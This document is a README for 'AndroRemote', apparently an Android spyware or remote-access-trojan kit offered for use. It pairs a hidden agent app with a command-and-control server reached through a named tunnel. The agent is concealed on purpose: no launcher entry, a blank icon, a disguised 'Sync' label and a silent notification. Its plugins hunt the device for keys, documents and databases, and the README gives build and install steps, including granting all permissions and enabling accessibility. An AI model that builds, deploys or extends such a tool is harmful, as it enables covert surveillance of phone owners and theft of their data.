# AndroRemote

Headless Android 15 remote-management agent + C2 server. APK has **no GUI and is hidden**: no launcher entry, blank app icon, `Sync` label, blank notification icon with an empty IMPORTANCE_MIN notification — everything driven from a terminal.

Two channels, both always active when configured:

1. **adb-direct** — `androremote adb` over `adb forward` (`tcp:8741 → tcp:8740`). Works when USB/adb attached. Raw binary transport.
2. **C2 over internet** — agent beacons *out* through a stable Cloudflare tunnel to the C2 server (`androremote`). No port forwarding; works on NAT/telephony networks. Base64 transport, AES-256-GCM encrypted.

Stable C2 endpoint: `https://c2.threatvector.tech` (named Cloudflare tunnel, survives C2 restarts — installed APKs reconnect automatically).

## Installation

Install the package into your environment:

```sh
pip install .
# or for development:
pip install -e .
```

This registers the `androremote` CLI tool in your `$PATH`.

## Repo layout

| Path | What |
|---|---|
| `GUIDE.md` | full documentation — setup, build, ops, protocol |
| `androremote/` | Python package: C2 server, unified CLI, adb bridge, modular plugin engine |
| `androremote/plugins/` | Plugin framework + built-in plugins (`triage`, `file_hunter`, `monitor`) |
| `pyproject.toml` / `setup.py` | Package build & console script definitions (`androremote`, `c2`) |
| `c2.py` | C2 server wrapper (backward compatibility) |
| `androremote.py` | adb-direct CLI wrapper (backward compatibility) |
| `build.sh` | APK build (optional C2 URL argument) |
| `app/src/main/` | Android agent: `RemoteService`, `C2Beacon`, capture/accessibility services, receivers |
| `libs/` | OkHttp + Okio jars (auto-downloaded by build.sh) |
| `keystore/release.keystore` | APK signing key (storepass `androremote`) |

## Quick start

```sh
# 1. Start C2 server (stable tunnel auto-starts: https://c2.threatvector.tech)
androremote

# 2. Build agent APK against the stable C2 URL
./build.sh https://c2.threatvector.tech

# 3. Install + provision (USB)
adb install -r -g build/apk/androremote.apk
adb shell am start-foreground-service -n com.ohmpi.androremote/.RemoteService
androremote axenable
```

Within ~15s the phone appears in `androremote` (`/sessions`), then `/use <id>` and drive it.

## Modular Plugin System

AndroRemote features a dynamic, hot-reloadable plugin system:

- **Built-in plugins**:
  - `triage` (`/triage [all|info|perms|net|notifs]`): one-shot automated device reconnaissance and posture report.
  - `file_hunter` (`/hunt <category|ext> [path]`): search device storage for documents, keys, databases, archives.
  - `monitor` (`/monitor [status|history|clear]`): real-time session telemetry, beacon frequency tracking, and connection history.
- **Operator Commands**:
  - `/plugins` or `/plugin list`: show all loaded plugins, versions, and commands.
  - `/plugin info <name>`: detailed view of commands and event hooks.
  - `/plugin load <path>`: dynamically load an external plugin without restarting the C2 server.
  - `/plugin unload <name>` / `/plugin reload [name]`: unload or hot-reload plugins.
- **User Plugins Directory**:
  - Drop any `.py` plugin file into `~/.androremote/plugins/` to have it auto-discovered and loaded at startup.
- **CLI Management**:
  - `androremote plugins list`
  - `androremote plugins info <name>`
  - `androremote plugins path`

**Everything else — full capability table, protocol, tunnel setup, provisioning, remote-control/update details — lives in [`GUIDE.md`](GUIDE.md).**
